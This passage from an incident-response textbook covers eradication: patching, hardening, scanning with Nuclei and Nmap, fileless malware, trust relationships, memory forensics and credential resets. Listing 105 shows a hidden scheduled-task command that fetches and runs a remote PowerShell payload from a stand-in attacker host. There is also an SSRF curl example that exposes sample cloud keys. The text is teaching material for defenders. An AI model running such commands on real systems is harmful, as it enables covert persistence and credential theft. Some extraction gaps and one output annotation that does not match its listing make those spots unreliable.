# 第 13-4 章：根除階段－漏洞修補、系統強化與基線重建

> 模組化子章節 | 隸屬來源:  (行 5195 ~ 6923)

---

authority to approve these bypasses so that the question is not debated mid-incident. Document any

deviations from normal procedures for the incident record.

Consider Phased Rollout for Large Environments : For environments with many affected systems, consider

a phased rollout in which groups of systems are patched and verified before moving to the next group. This

approach identifies concerns or problems with patching early in the process before they affect all systems.

Start with lower-risk systems, when possible, to validate the patch before applying it to critical

infrastructure.

Verify System Functionality After Patching : Use system verification procedures to ensure systems

preserve needed functionality after patching. Coordinate with system owners to validate that patched

systems continue to operate correctly. Some patches may require configuration changes or application

updates to maintain compatibility. Document any issues encountered and their resolutions for future

consideration.

Addressing Unpatchable Systems

Some systems cannot be patched immediately due to end-of-life software, vendor constraints, or

operational dependencies. When patching is not feasible, organizations should implement compensating

controls to reduce risk until the system can be updated or replaced.

Network segmentation isolates vulnerable systems from potential attack sources. Place unpatchable

systems in dedicated network segments with strict network access control rules limiting inbound and

outbound connections to only required traffic. Monitor these segments closely for signs of exploitation

attempts.

Application-layer controls, such as web application firewalls, can block exploitation attempts for web-based

vulnerabilities. Deploy virtual patching rules that detect and block exploit traffic patterns specific to the

vulnerability. These controls provide temporary protection but should not replace permanent remediation

(see WAF Bypass Opportunities).

maintaining compensating controls requires ongoing effort and attention, diverting resources from other

security priorities. Treat unpatchable systems as technical debt that accumulates risk until permanently

addressed.

In regulated environments, an unpatchable system running with a known critical vulnerability often creates

a formal disclosure or risk-tracking obligation in addition to the technical risk. When the incident response

team discovers such a system that the organization did not previously know existed, the remediation

responsibility ends once compensating controls are in place. The system owner should then initiate the

organization’s internal risk-generation or risk-tracking process so the residual risk is recorded against the

appropriate business function rather than disappearing with the incident record.

Compensating controls should be applied as a temporary measure to mitigate

vulnerabilities, not as a permanent solution.

WAF BYPASS OPPORTUNITIES

Many organizations rely on Web Application Firewall (WAF) platforms to augment the security of

public-facing web applications. Using on-premises, cloud, or SaaS WAF solutions, organizations can

block common web application attacks such as SQL injection, cross-site scripting (XSS), and remote

file inclusion.

However, WAFs are not foolproof. A dedicated attacker with patience, time, and creativity can find

opportunities to exploit vulnerable systems despite WAF controls. Even widely-respected WAF

platforms like Cloudflare have a history of vulnerabilities that allow attackers to evade the WAF

protections:

• Parsing Discrepancy Evasion (2025): The research WAFFLED: Exploiting Parsing Discrepancies to

Bypass Web Application Firewalls demonstrated over 1,200 bypasses across multiple WAF

platforms, including Cloudflare, exploiting differences in how WAFs, proxies, and servers parse

HTTP data. [32]

• WAF bypass via XSS (2025): A write-up in 2025 showed that carefully obfuscated or non-standard

payloads could evade Cloudflare’s controls, yielding a successful reflected XSS attack. [33]

• Shared Infrastructure Attacks (2023) : CTI provider SOCRadar reported multiple Cloudflare

protection bypass vulnerabilities by using Cloudflare’s shared infrastructure to pivot attacks onto

protected applications. [34]

• JSON-based SQL payloads (2022) : Attackers embedded SQL injection attacks within JSON

payloads to evade detection. [35]

WAF systems provide valuable protection, notably through enhanced threat reporting, automated

integration of CTI data to block known bad IPs, and mitigation of common web application attacks.

However, organizations should not rely solely on WAFs to protect vulnerable web applications.

Attackers can and do find ways to bypass WAF protections, especially when motivated by valuable

targets.

Broader Vulnerability Assessment

When remediating an exploited vulnerability, consider the broader environment for similar vulnerabilities.

The vulnerability exploited in the incident may not be unique to the compromised system. Other systems

running the same software version may also be vulnerable to the same attack. Expand remediation beyond

systems directly involved in the incident to all systems with the same vulnerability.

Use vulnerability scanning tools to identify all instances of the vulnerable software across the environment.

Commercial vulnerability scanners, open-source platforms such as Greenbone (which includes OpenVAS),

or agent-based scanning via EDR platforms can identify other vulnerable systems that should also be

remediated.

Open-source vulnerability scanning tools such as Nuclei can use vulnerability identifiers to scan for

additional vulnerable targets. Nuclei uses a YAML-based template system to define vulnerability checks,

making it easy to create custom checks for specific CVEs.

For example, consider a scenario in which a network-attached camera is vulnerable to a Server-Side

Request Forgery (SSRF), where specific HTTP requests can access internal network resources, disclosing

sensitive information. In this example, an attacker can access a specific endpoint on the IP cameras ( /fetch)

with the url parameter to trigger the SSRF vulnerability and access other resources on behalf of the camera.

Using the SSRF vulnerability, an attacker can access an internal administrative page that returns

configuration details, including AWS credentials stored in the camera’s configuration for saving video

footage to an S3 bucket, as shown in Listing 99.

Listing 99 | IP Camera SSRF Vulnerability Discloses AWS Credentials

$ curl -s "hxxp://192[.]168[.]1[.]140/fetch?url=hxxp://127.0.0.1/internal-admin"

{

"content_length": 169,

"content_preview": "{\n  \"AccessKeyId\": \"AKIA_DUMMY_SAMPLE_KEY_05\",\n  \"SecretAccessKey\":

\"wJalrXUtnFEMI_DUMMY_SAMPLE_SECRET_KEY_05\",\n  \"Status\": \"Active\",\n  \"UserName\":

\"cameralogic-s3export\"\n}\n", 1

"status_code": 200,

"url": "hxxp://127[.]0[.]0[.]1/internal-admin"

}

1 A web server response to accessing the /internal-admin page discloses configuration settings, including AWS credentials.

To identify other vulnerable IP cameras on the network, create a custom Nuclei template that checks for

the presence of the vulnerable endpoint and parameter, as shown in Listing 100.

Listing 100 | Nuclei Template for IP Camera SSRF Vulnerability Test

id: ssrf-url-fetcher

info:

name: SSRF in CameraLogic URL Fetcher Endpoint

author: Joshua Wright

severity: high

tags: ssrf

http:

- method: GET

path:

- "{{BaseURL}}/fetch?url=hxxp://127[.]0[.]0[.]1/internal-admin" 1

matchers:

- type: word

words: 2

- "AccessKeyId"

- "SecretAccessKey"

1 The vulnerable endpoint and parameter to test for SSRF where BaseURL is replaced with the target IP address or hostname

2 Strings expected in the response disclosing AWS key information if the vulnerability is present.

With the template saved in a file (e.g., ssrf-url-fetcher.yaml), run Nuclei against a list of target IP addresses

to identify other vulnerable cameras, as shown in Listing 101.

Listing 101 | Nuclei Scan for Vulnerable IP Cameras

$ nuclei -t ssrf-url-fetcher.yaml -list hosts-to-scan.txt

__     _

____  __  _______/ /__  (_)

/ __ \/ / / / ___/ / _ \/ /

/ / / / /_/ / /__/ /  __/ /

/_/ /_/\__,_/\___/_/\___/_/   v3.5.1

projectdiscovery.io

[INF] nuclei-templates are not installed, installing...

[INF] Successfully installed nuclei-templates at /root/nuclei-templates

[INF] Supplied input was automatically deduplicated (1 removed).

[WRN] Loading 1 unsigned templates for scan. Use with caution.

[INF] Current nuclei version: v3.5.1 (latest)

[INF] Current nuclei-templates version: v10.3.4 (latest)

[INF] New templates added in latest release: 0

[INF] Templates loaded for current scan: 1

[INF] Targets loaded for current scan: 27

[INF] Running httpx on input host

[INF] Found 8 URL from httpx

[ssrf-url-fetcher] [http] [high] hxxp://172[.]16[.]40[.]20/fetch?url=hxxp://127.0.0.1/internal-admin

[ssrf-url-fetcher] [http] [high] hxxp://192[.]168[.]1[.]140/fetch?url=hxxp://127.0.0.1/internal-admin

[INF] Scan completed in 557.642459ms. 2 matches found.

1 Nuclei output showing a vulnerable IP camera at 172.16.40.20

Vulnerability scanning is a valuable tool for identifying other systems that may share the same vulnerability

exploited during the incident. By expanding remediation beyond the systems directly involved in the

compromise, responders reduce the risk of subsequent attacks through the same vulnerability on other

systems in the environment.

Configuration Hardening

Vulnerability remediation is not limited to patching software flaws. System misconfigurations often

contribute to attack success by providing attackers with opportunities they would not have on hardened

systems. Consider which opportunities exist to apply configuration hardening during the eradication action,

based on security baselines and lessons learned from the incident.

Vulnerability remediation should cover all the supporting elements that led to the incident,

not software patching alone.

Harden System Configurations

In Section 7.2.3.3, we looked at the preparation activity for applying CIS benchmarks and other hardening

guides. [36]

In the eradication waypoint, responders should revisit these processes to ensure that the

hardening guides have been applied to the extent possible based on the investigation findings and the needs

of the organization.

For many organizations, system configuration hardening is completed during initial system deployment.

System updates, configuration changes, and new features introduced with product updates can, over time,

expand the attack surface for devices. During eradication, review system configurations to ensure that

hardening measures remain in place and that no new weaknesses have been introduced.

Enumerate Accessible Services

Port scan systems to enumerate open services and identify unnecessary exposure. Consider a network

perspective when performing this step: scanning from an internal network segment reveals different

services than scanning from an external perspective. Compare results against documented service

requirements to identify services that should be disabled or restricted. Pay particular attention to

management interfaces, legacy protocols, and services that were not intentionally exposed.

To enumerate accessible services, use tools like Nmap to perform comprehensive port scans. For example,

the Nmap command in Listing 102  scans a target system for open TCP ports and attempts to identify

running services through version enumeration, providing insight into the accessible services on the target.

Alternatively, vulnerability scanning platforms can provide similar service enumeration capabilities as part

of their scanning process.

Listing 102 | Nmap Service Enumeration Example

$ sudo nmap -p 1-65535 -sV 192.168.1.119

Starting Nmap 7.98 ( hxxps://nmap[.]org ) at 2025-12-04 06:29 -0500

Nmap scan report for 192.168.1.119

Host is up (0.0054s latency).

Not shown: 65528 closed tcp ports (reset)

PORT      STATE SERVICE       VERSION

22/tcp    open  ssh           OpenSSH 9.9 (protocol 2.0) 1

88/tcp    open  kerberos-sec  Heimdal Kerberos (server time: 2025-12-04 11:30:16Z)

2222/tcp  open  EtherNetIP-1?

49185/tcp open  unknown

2 services unrecognized despite returning data. If you know the service/version, please submit

the following fingerprints at hxxps://nmap[.]org/cgi-bin/submit.cgi?new-service :

[...]

Service detection performed. Please report any incorrect results at hxxps://nmap[.]org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 180.93 seconds

1 Nmap output indicates that an SSH remote access service is running on port 22.

2 Nmap output indicates that a VNC remote access service is running on port 5900.

As an alternative to port scanning, which can be taxing on network resources or introduce risk of service

disruption, review local listening services on each system. For Windows systems, use PowerShell Get-NetTCPConnection and Get-NetUDPEndpoint cmdlets to enumerate listening TCP and UDP ports, as shown in

Listing 103. For Linux systems, use ss -tuln or netstat -tuln commands to list listening services. On macOS

systems, use lsof -i -n -P | grep LISTEN.

Listing 103 | PowerShell Listening Services Example

PS C:\> Get-NetTCPConnection -State Listen | Select-Object -Property

LocalAddress,LocalPort,OwningProcess,@{Name='ProcessName'; Expression={(Get-Process -Id

$_.OwningProcess).ProcessName}} 1

LocalAddress    LocalPort OwningProcess ProcessName

------------    --------- ------------- -----------

::                  20718           676 services

::                   1540          2348 spoolsv

::                   1539          1096 svchost

::                   1538          1200 svchost

::                   1537           540 wininit

::                   1536           684 lsass

::                    445             4 System

::                    135           916 svchost

0.0.0.0             20718           676 services

0.0.0.0              9001          5896 nginx 2

0.0.0.0              5040          5056 svchost

0.0.0.0              1540          2348 spoolsv

0.0.0.0              1539          1096 svchost

0.0.0.0              1538          1200 svchost

0.0.0.0              1537           540 wininit

0.0.0.0              1536           684 lsass

192.168.171.143       139             4 System

0.0.0.0               135           916 svchost

1 A PowerShell command retrieves listening TCP ports and the associated process names.

2 PowerShell output indicates that the Nginx web server is listening on port 9001.

Enumerating accessible services on each system provides a more accurate view of the services that could

expose systems, but requires access to each system individually and coordination to collect and review the

results.

Review Network Device Configurations

Review the configuration of network devices, including firewalls, routers, and switches, to ensure that

access controls align with the principle of least privilege. Poor change management practices often lead to

overly permissive rules that unnecessarily expose systems. Firewall rules may accumulate over time as

temporary exceptions become permanent, or as rules are added without removing obsolete entries.

For example, consider the FortiGate firewall policy in Listing 104 . In this configuration, a Virtual IP (VIP)

object exposes an internal web server on port 8080 to the public internet via port 11111 on a public IP

address. Replicated from a customer’s environment, this configuration was no longer needed but remained

active, exposing the internal web server to potential attack from the internet.

Listing 104 | FortiGate Firewall Policy Example

FGT-Edge # show firewall vip

config firewall vip

edit "WEBSERVER-8080" 1

set uuid 7a3d9f2e-4b8c-51ef-a6d2-8c4e7f1b3a5d

set extip 45.60.31.34 2

set extintf "wan1"

set portforward enable

set mappedip "10.10.10.10"

set extport 11111 3

set mappedport 8080

next

end

FGT-Edge # show firewall policy 15

config firewall policy

edit 15

set uuid 2f8a1c4d-6e9b-47d3-b5f1-9a2c8d4e6f7a

set name "Allow-WEBSERVER-8080"

set srcintf "wan1"

set dstintf "internal"

set action accept

set srcaddr "all" 4

set dstaddr "WEBSERVER-8080"

set schedule "always"

set service "TCP-11111"

set logtraffic all

set nat enable

next

end

1 Virtual IP (VIP) object exposing an internal service.

Disable Unnecessary Services

Disable unnecessary services and protocols that attackers commonly exploit. Remote access services, in

particular, should be limited to those required for business operations. Services such as Telnet, FTP, RDP,

and SMB are frequently targeted by attackers and should be disabled unless explicitly required. Where

remote access is required, use secure alternatives such as SSH or VPNs with multi-factor authentication.

After hardening, update the configuration management database (CMDB) and submit the corresponding

change control records so that the new baseline is the authoritative reference for the affected systems.

Without this step, routine operations work often re-enables the settings that were turned off during

eradication, either because the change never made it into the CMDB or because the team making later

changes is working from stale documentation.

ERADICATION CHALLENGES

Modern attacks present unique challenges that complicate eradication efforts. These challenges will often

combine in incidents, creating complex eradication scenarios that require multiple iterations through the

DAIR response actions loop. Understanding these challenges helps responders anticipate difficulties and

plan appropriate countermeasures.

In this section, we’ll address four recurring challenges: living-off-the-land techniques that abuse legitimate

system tools, fileless malware that operates from memory without leaving disk artifacts, legitimate remote

monitoring and management software repurposed by attackers, and threats that cross trust boundaries

between organizations and their suppliers or service providers.

Living Off the Land

Attackers increasingly use legitimate system tools (Living Off the Land Binaries, Scripts, and Libraries,

colloquially referred to as LOLBins), making it more difficult to distinguish malicious activity from normal

activity. PowerShell, WMI, Windows Scripting Host, even built-in and third-party utilities all represent an

opportunity for attackers to carry out their attack goals.

Eradication challenges arise because responders cannot simply delete PowerShell, WMI, or other essential

system tools since they are required for legitimate operations. Base64-encoded PowerShell commands

executing from memory leave minimal forensic artifacts, making traditional file-based eradication

ineffective. Legitimate administrative activity may look identical to attacker activity, complicating the

identification of malicious actions.

Mitigation approaches focus on behavioral detection rather than artifact-based detection to identify

malicious use of legitimate tools. Monitor for suspicious PowerShell usage patterns, including encoded

commands, unusual command-line arguments, or execution from unexpected parent processes. Implement

PowerShell logging and constrained language mode (CLM) where appropriate to limit attacker capabilities

while maintaining necessary functionality. Use application allowlisting to control script execution,

permitting only authorized scripts to run.

THIRD-PARTY LOLBIN ACCESS

In a recent penetration test, my team gained access to a Virtual Desktop Infrastructure (VDI)

environment through compromised user credentials. With access to the VDI, we sought

opportunities to move laterally into the broader cloud environment and to attack the Azure

infrastructure in use. However, attempts to run common tools were blocked by endpoint protection

controls.

Figure 116 | Blocked Executable Alert

To assess the platform restrictions, we generated a list of programs in a Windows batch script and

attempted to execute each one. This approach generated a lot of alerts in the endpoint protection

system, but eventually we discovered that python.exe was allowed to run. Although Python was not

installed on the VDI system, the policy was permissive enough to allow execution of the binary. This

permitted us to manually copy a Python installation tree to the VDI and run Python scripts. With the

ability to run Python scripts, we had a powerful toolset to interact with the system and network,

bypassing many of the restrictions imposed by the endpoint protection system.

When we think about LOLBins, we often focus on built-in operating system tools like PowerShell,

WMI, csc.exe, and others. Indeed, these tools are commonly used by attackers to evade detection.

However, third-party applications authorized to run in the environment can also serve as LOLBins.

Even if not installed by default, an attacker who can enumerate the environment policy may be able

to identify third-party applications that are allowed to run and exploit them for malicious purposes.

Defenders should audit application allowlist policies to identify any third-party applications that

provide scripting or code-execution capabilities. These tools provide powerful capabilities that can

render application allowlisting ineffective if not properly controlled.

Fileless Malware

Memory-resident threats leave minimal artifacts on disk, complicating traditional eradication approaches

that focus on files. Malware may execute entirely in memory through PowerShell scripts, injected code, or

process hollowing.

For example, using the Windows task scheduler ( schtasks.exe), an attacker can create a persistence

mechanism that runs PowerShell for a given event (such as a failed login attempt) to download and execute

a payload entirely in memory, as shown in Listing 105. The PowerShell command uses Invoke-WebRequest to

download a script from a remote server and executes it directly in memory using IEX (Invoke-Expression),

avoiding any files being written to disk, and allowing the attacker to remotely update the payload as needed

to meet their attack goals.

Listing 105 | Windows Scheduled Task Fileless Persistence Example

C:\> schtasks /create /tn \"Windows Security Audit\" /tr \"powershell.exe -WindowStyle Hidden

-ExecutionPolicy Bypass -Command \\\"IEX ([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri 'hxxp://attackerc2[.]tld/payload.ps1' -UseBasicParsing).Content))\\\"\" /sc

onevent /ec Security /mo \"*[System[EventID=4625]]\" /ru SYSTEM /f 1

SUCCESS: The scheduled task "Windows Security Audit" has successfully been created.

1 Create a scheduled task that runs PowerShell to download and execute a script in memory on failed login events; the

attacker script is hosted on the attackerc2.tld web server as payload.ps1

While investigation techniques to identify persistence through scheduled tasks will find this artifact,

determining what the attacker’s remote PowerShell script does requires additional information, such as

detailed system monitoring or PowerShell script execution logging.

Because fileless malware artifacts reside in memory, rebooting a system can remove the current malware

threat. However, if the persistence mechanism remains, the malware can be reloaded into memory,

requiring additional remediation effort. When dealing with fileless malware, responders need to identify and

remove persistence mechanisms as part of the eradication process to prevent subsequent attacker access.

Legitimate Remote Monitoring and Management Tool Investigation

Attackers increasingly utilize legitimate remote monitoring and management (RMM) tools such as

TeamViewer, AnyDesk, and ConnectWise ScreenConnect to maintain persistent access to compromised

environments. Unlike custom malware, these tools have valid digital signatures, established network traffic

patterns, and may already be permitted by security controls. The result is persistent access that appears

identical to legitimate IT support activity.

For example, the Akira ransomware group, a threat actor reportedly collecting over $42 million in

ransomware payments across 250 attacks, has been observed using AnyDesk as a primary remote access

tool during intrusions. [37]

Through AnyDesk, Akira operators can maintain persistent access to

compromised systems, facilitating remote desktop access (as shown in Figure 117 ), data exfiltration, and

ransomware deployment through file transfer capabilities (as shown in Figure 118).

Figure 117 | AnyDesk Remote Desktop Access

Figure 118 | AnyDesk File Transfer Access

Eradication challenges arise because these tools are designed to provide reliable remote access and include

features that make them resilient. Remote access tools often install as services with automatic restart

capabilities, making simple process termination ineffective. Some tools support unattended access

configurations that persist even when the visible application is closed or uninstalled.

Attackers can install these tools through multiple vectors, including compromised accounts, phishing, or the

exploitation of other vulnerabilities. Once installed, access is via the vendor’s cloud infrastructure rather

installations. Configure endpoint protection to alert on or block the installation of unapproved remote

access software. For authorized tools, implement centralized management that provides visibility into active

sessions and the ability to revoke access.

Cross-Trust Boundary Threat Investigation

Attackers who compromise a single domain or identity provider can utilize trust relationships to establish

persistence across connected environments. Forest trusts, external domain trusts, and federated identity

configurations extend authentication across organizational boundaries, creating pathways for attackers to

maintain access even after eradication efforts in the initially compromised environment.

Evidence analysis challenges arise because trust relationships enable attackers to gain access to

environments that may not have been directly compromised. An attacker who compromises a domain

controller in one forest can create accounts or modify permissions in a trusted forest. These artifacts

appear in the trusted forest’s logs as legitimate cross-forest authentication rather than lateral movement

from a compromised source. Analysts examining only the trusted forest may find valid accounts and

permissions with no local indicators of how they were created.

Consider an organization with a two-way forest trust between a corporate forest (corp.falsimentis.com) and

an acquisition’s forest (pseudovision.com). An attacker who gains Domain Admin access in

pseudovision.com can use the trust relationship to add a malicious account to privileged groups in

corp.falsimentis.com, as shown in Figure 119.

Figure 119 | Cross-Forest Attack Path Example

Federated identity systems present similar challenges.  Organizations using SAML or OIDC federation trust

external identity providers to authenticate users. An attacker who compromises the identity provider (IdP)

can issue tokens granting access to all relying party applications. Eradicating the attacker from individual

applications is ineffective if the compromised IdP continues issuing valid tokens.  Similarly, hybrid

environments synchronizing on-premises Active Directory with Entra ID can propagate compromised

accounts in either direction, requiring coordinated remediation across both environments.

Scoping eradication across trust boundaries requires enumerating all trust relationships from the

compromised environment. For Active Directory environments, identify forest trusts, external trusts, and

realm trusts that could provide pathways to other domains using the PowerShell Active Directory module

and the Get-ADTrust command as shown in Listing 106 . For federated identity, identify all relying party

applications that accept tokens from the compromised identity provider. Review authentication logs in

trusted environments for activity originating from the compromised source during the incident timeframe.

Listing 106 | Active Directory Trust Enumeration

PS C:\> Get-ADTrust -Filter *

Name             Source                 Target                Direction       TrustType

----             ------                 ------                ---------       ---------

pseudovision.com corp.falsimentis.com   pseudovision.com      Bidirectional   Forest

genusight.com    corp.falsimentis.com   genusight.com         Outbound        External

Artifact removal requires coordinated action across trust boundaries. Disabling a compromised account in

one domain does not remove group memberships or permissions that the account created in trusted

domains. Revoking tokens in one identity provider does not invalidate sessions in federated applications

that cache authentication state. Eradication plans should include explicit steps for each trusted

environment, with verification that cross-boundary artifacts have been removed.

Sequencing eradication across trust boundaries depends on the direction of trust and the attacker’s access.

If an attacker compromises the trusted source (the IdP or the forest that others trust), remediate that

environment first to prevent continued propagation. If the attacker used trust relationships to pivot into

other environments, those downstream environments may require independent eradication efforts

coordinated with the source environment’s remediation.

Listing 107 | Process Listing with Volatility

$ vol -qf greystone_eng_caseir0523.raw windows.pslist.PsList

Volatility 3 Framework 2.26.2

PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId

4       0       System          0xbf84ba8b4040  167     -       N/A

[...]

6824    856     svchost.exe     0xbf84c1234560  8       -       0

7012    856     svchost.exe     0xbf84c2345670  6       -       0

7156    7012    rundll32.exe    0xbf84c3456780  3       -       0 1

8234    1       smss.exe        0xbf84c4567890  0       -       0 2

[...]

1 rundll32.exe spawned by svchost.exe (unusual parent process relationship).

2 smss.exe with parent process ID of 1 instead of 4 (System) indicates possible process manipulation.

The process listing revealed two anomalies that endpoint protection had not flagged. First, a rundll32.exe

process had been spawned by svchost.exe, an unusual parent-child relationship that suggested process

injection or DLL side-loading. Second, the smss.exe process showed a parent process ID of 1 rather than the

expected System process (PID 4), suggesting further system manipulation.

Maya continued investigating the suspicious rundll32.exe process using a code-injection detection plugin

such as Volatility’s malfind to identify any injected code in process memory, as shown in Listing 108.

Listing 108 | Detecting Injected Code with Malfind

$ vol -qf greystone_eng_caseir0523.raw windows.malfind.Malfind --pid 7156

Volatility 3 Framework 2.26.2

PID     Process         Start VPN       End VPN         Tag     Protection      CommitCharge

PrivateMemory   File

7156    rundll32.exe    0x1d0000        0x1d2fff        VadS    PAGE_EXECUTE_READWRITE  3

1       Disabled

0x1d0000        4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00     MZ.............. 1

[...]

1 MZ header indicating a PE file injected into process memory.

The Malfind plugin output revealed that an executable file (indicated by the MZ header) had been injected

into the rundll32.exe process’s memory space.  Maya extracted the injected code for further analysis using

the Volatility memdump plugin, then used the netscan plugin to examine network connections, as shown in

Listing 109.

Listing 109 | Network Connection Analysis

$ vol -qf greystone_eng_caseir0523.raw windows.netscan.NetScan

Volatility 3 Framework 2.26.2

Offset          Proto   LocalAddr    LocalPort  ForeignAddr      ForeignPort  State        PID

Owner

0xbf84c8901234  TCPv4   10.50.23.42  49234      123.188.115.243  443          ESTABLISHED  7156

rundll32.exe 1

0xbf84c8902345  TCPv4   10.50.23.42  49567      10.50.20.15      445          ESTABLISHED  8234

smss.exe     2

0xbf84c8903456  TCPv4   10.50.23.42  49892      10.50.20.18      3389         ESTABLISHED  8234

smss.exe     3

[...]

1 C2 connection from injected rundll32.exe to external IP.

2 SMB connection to internal file server from fake smss.exe

3 RDP connection to the engineering server from fake smss.exe

The network analysis revealed that the threat was far more serious than the initial assessment suggested.

The injected rundll32.exe maintained the C2 connection that endpoint protection had detected.  The fake

smss.exe process, however, had established connections to two internal systems: a file server (10.50.20.15)

and an engineering server (10.50.20.18). This indicated lateral movement that the initial investigation had

missed.

Maya used Volatility to examine the command-line arguments for the suspicious processes, which can offer

insights into how they were used, as shown in Listing 110.

Listing 110 | Command Line Analysis

$ vol -qf greystone_eng_caseir0523.raw windows.cmdline.CmdLine --pid 7156,8234

Volatility 3 Framework 2.26.2

PID     Process         Args

7156    rundll32.exe    C:\Windows\System32\rundll32.exe

C:\Users\bthompson\AppData\Local\Temp\update.dll,DllMain

8234    smss.exe        C:\Windows\Fonts\smss.exe -enc

aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA... 1

1 Base64-encoded PowerShell command executed by fake smss.exe

The command-line analysis revealed that the fake smss.exe was actually executing an encoded PowerShell

script. Maya decoded the Base64 string and discovered a second-stage loader that established persistence

and facilitated lateral movement.

To understand the full scope of attacker activity, Maya examined the handles held by the malicious

processes to identify files and registry keys they had accessed, as shown in Listing 111.

Listing 111 | Handle Analysis for Malicious Process

$ vol -qf greystone_eng_caseir0523.raw windows.handles.Handles --pid 8234

Volatility 3 Framework 2.26.2

PID   Process   Offset          HandleValue  Type  GrantedAccess  Name

8234  smss.exe  0xbf84d1234560  0x4          Key   0x20019

\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

\Device\HarddiskVolume3\Users\bthompson\Documents\ICS_Designs 1

8234  smss.exe  0xbf84d3456780  0x24         File  0x100081

\Device\HarddiskVolume3\Users\bthompson\Documents\Supplier_Pricing

[...]

1 File handles confirming access to sensitive engineering documents.

The handle analysis confirmed Maya’s initial concerns about targeting this engineer’s workstation. The

attacker specifically accessed directories containing industrial control system designs and supplier pricing

information, substantially expanding the incident’s scope.

Maya documented her memory forensics findings and their implications for eradication:

• Processes requiring removal: Injected rundll32.exe (PID 7156), fake smss.exe (PID 8234 located in

C:\Windows\Fonts\).

• Persistence mechanism: Registry Run key modification requiring removal.

• Malicious files: C:\Users\bthompson\AppData\Local\Temp\update.dll, C:\Windows\Fonts\smss.exe

• Lateral movement targets: File server 10.50.20.15, engineering server 10.50.20.18 require additional

scoping and investigation.

• Data exposure: ICS_Designs and Supplier_Pricing directories accessed; determine if attacker exfiltrated

data from these locations.

The memory forensics investigation transformed what appeared to be a routine malware cleanup into a

multi-system incident requiring coordinated eradication. Without the memory analysis, the response team

would have removed the detected malware and declared the incident resolved. They would have been

unaware that the attacker had already moved laterally to additional systems and accessed sensitive

intellectual property.

Maya’s findings triggered a broader investigation effort into the incident, with scoping activities extending

to the file server and engineering server identified in the network connections.

The Coordinated Credential Reset

David Barrett, a senior security analyst at Northwind Financial Services, faced a complex eradication task.

The investigation confirmed that attackers gained domain admin access via a compromised service account

and had been in the environment for at least three weeks.  Memory forensics revealed the execution of a

credential-harvesting tool (Mimikatz) on two domain controllers, suggesting the attackers had harvested

credentials. The incident manager determined that a comprehensive credential reset was necessary to

eliminate attacker access.

David began by mapping the credential reset scope using Microsoft’s tier model as a framework.  He

identified twelve Tier 0 accounts (domain admins, enterprise admins, and accounts with DC logon rights),

forty-seven Tier 1 accounts (server administrators, database admins, and privileged service accounts), and

over 200 Tier 2 accounts (workstation admins and help desk staff with elevated privileges). The environment

also had eighty-three service accounts running critical applications, each requiring coordination with

application owners before reset.

Before executing any resets, David confirmed that the administrative workstations and jump hosts used to

perform the resets were themselves verified as clean. A credential reset performed from a compromised

workstation simply hands the new credentials to the attacker, so the systems used to drive the reset are as

important to verify as the accounts being reset.

Figure 120 | Northwind Financial Account Tiers

David documented the dependencies that would affect the sequencing of account resets. The trading

platform relied on a service account svc_tradingdb that authenticated to Microsoft SQL Server clusters. The

backup system used svc_backup with credentials stored in the backup software’s configuration. Several

legacy applications used service accounts with passwords that had not been rotated in years. The

application administration teams for these systems were not certain they could update the credentials

without extended outages.

David presented the credential reset plan to the incident manager, proposing a phased approach over a

seventy-two-hour window, as shown in Table 31.

Table 31 | Credential Reset Phases

PHASE SCOPE TIMING

Phase 1 KRBTGT account (twice), Tier 0 accounts Friday 11 PM - Saturday 3 AM

Phase 2 Tier 1 accounts, critical service accounts Saturday 6 AM - 12 PM (reduced

trading hours)

Phase 3 Tier 2 accounts, remaining service accounts Saturday 2 PM - Sunday 6 PM

Phase 1 began on Friday at 11 PM during a scheduled maintenance window. David started with the KRBTGT

account, executing the first reset and waiting for replication to complete across all domain controllers, as

shown in Listing 112.

Listing 112 | KRBTGT Reset - Phase 1

PS C:\> Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString

-AsPlainText "K3rb3r0s#R3s3t#Ph4s31!" -Force)

PS C:\>

After confirming replication, David waited ten hours before executing the second KRBTGT reset Saturday

morning. This delay ensured that any golden tickets created by the attacker would exceed the maximum

ticket lifetime and become invalid after the second reset.

With the KRBTGT reset complete, David moved to Tier 0 accounts. He had coordinated with each domain

admin in advance, scheduling their resets during the maintenance window when they wouldn’t need access.

For the two domain admin accounts that belonged to on-call staff, he created temporary accounts with

limited validity periods to maintain emergency access capability during the reset window.

Phase 2 required careful coordination with application teams. David had prepared a spreadsheet tracking

each service account, its dependent applications, the application owner’s contact information, and the

agreed-upon reset procedure outlined in Figure 121. For the trading platform’s database service account, the

application team had tested the credential update procedure in their staging environment earlier that week.

Figure 121 | Service Account Reset Coordination

The backup service account presented an unexpected challenge. When the backup team attempted to

update the credentials in their software, they discovered the configuration was encrypted with the old

service account password. David worked with the backup vendor’s support team to export the

configuration, update the credentials, and re-import the settings, extending Phase 2 by two hours.

Phase 3 proceeded more smoothly, with Tier 2 accounts reset in batches organized by department. David

used PowerShell to generate temporary passwords and trigger password change requirements at next

logon, as shown in Listing 113.

Listing 113 | Tier 2 Batch Password Reset

PS C:\> $tier2Users = Get-ADUser -Filter * -SearchBase "OU=Tier2Admins,DC=northwind,DC=local"

PS C:\> foreach ($user in $tier2Users) {

>>     $tempPassword = ConvertTo-SecureString -AsPlainText ( -join (1..16 | ForEach-Object {

[char](Get-Random -Minimum 33 -Maximum 127) }) ) -Force

>>     Set-ADAccountPassword -Identity $user -Reset -NewPassword $tempPassword

>>     Set-ADUser -Identity $user -ChangePasswordAtLogon $true

>>     Write-Host "Reset password for $($user.SamAccountName)"

>> }

Reset password for jsmith_admin

Reset password for mwilliams_admin

Reset password for kjohnson_admin

[...]

Throughout the reset process, David monitored for signs of attacker activity.  He configured alerts for

authentication failures from the known attacker IP ranges, new account creations, and any attempts to use

the old KRBTGT hash. The security team maintained continuous monitoring of domain controller event logs,

watching for Event ID 4768 (Kerberos TGT requests) that would indicate the attacker attempting to use

previously harvested credentials.

After completing all three phases, David executed validation checks to confirm the reset effectiveness, as

shown in Listing 114.

Listing 114 | Credential Reset Validation

PS C:\> Get-ADUser krbtgt -Properties PasswordLastSet | Select-Object PasswordLastSet

PasswordLastSet

---------------

11/16/2025 9:15:22 AM 1

